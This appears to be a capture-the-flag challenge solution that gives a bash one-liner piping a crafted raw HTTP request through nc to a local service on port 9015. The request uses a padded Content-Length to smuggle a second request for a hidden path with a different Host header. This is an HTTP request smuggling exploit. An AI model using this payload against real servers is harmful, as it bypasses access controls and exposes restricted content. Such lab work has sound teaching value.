
<p align="center">
<img width="600" src="../static/solution.png">
</p>

The baseline for solving this challenge is already present in `check.sh`. 

Exploit it by running the following script in your bash:

  ```bash
  printf 'GET /a HTTP/1.1\r\n'\
  'Host: localhost\r\n'\
  'Content-Length: 56\r\n'\
  '\r\n'\
  'GET /_hidden/index.html HTTP/1.1\r\n'\
  'Host: notlocalhost\r\n'\
  '\r\n'\
  |nc 127.0.0.1 9015
  ```